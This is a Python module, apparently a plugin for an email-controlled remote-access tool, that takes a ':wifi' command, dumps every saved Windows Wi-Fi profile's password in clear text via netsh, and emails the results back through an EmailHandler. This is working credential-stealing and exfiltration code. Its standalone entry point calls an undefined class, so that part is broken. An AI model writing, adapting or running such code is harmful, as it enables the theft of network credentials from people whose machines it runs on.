import subprocess

class wifi:
    def __init__(self):
        self.name = "Wifi"
        self.info = "Retrieves Saved Wifi Passwords"
        self.args = []
        self.command = ":wifi"

    def get_wifi_profiles(self):
        """Retrieve the list of WiFi profiles stored on the system."""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, check=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
            return profiles
        except subprocess.CalledProcessError as e:
            print(f"Error retrieving WiFi profiles: {e}")
            return []

    def get_password(self, profile_name):
        """Retrieve the password for a given WiFi profile."""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'], capture_output=True, text=True, check=True)
            password_line = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "Key Content" in line]
            return password_line[0] if password_line else None
        except subprocess.CalledProcessError as e:
            print(f"Error retrieving password for {profile_name}: {e}")
            return None

    def get_all_passwords(self):
        """Retrieve the passwords for all WiFi profiles stored on the system."""
        passwords = {}
        for profile in self.get_wifi_profiles():
            passwords[profile] = self.get_password(profile)
        return passwords

    def format_passwords_as_text(self):
        """Format the WiFi profiles and their passwords as a text variable."""
        all_passwords = self.get_all_passwords()
        formatted_text = "Saved WiFi Profiles and Passwords:\n"
        for profile, password in all_passwords.items():
            formatted_text += f"Profile: {profile}\nPassword: {password if password else 'Not Available'}\n\n"
        return formatted_text
    
    def run(self,EmailHandler,msgId):
        password_text = self.format_passwords_as_text()
        EmailHandler.send_email(
            message = password_text,
            msgId=msgId,
            reply=True
        )

if __name__ == "__main__":

    retriever = WifiPasswordRetriever()
    password_text = retriever.format_passwords_as_text()
    print(password_text)
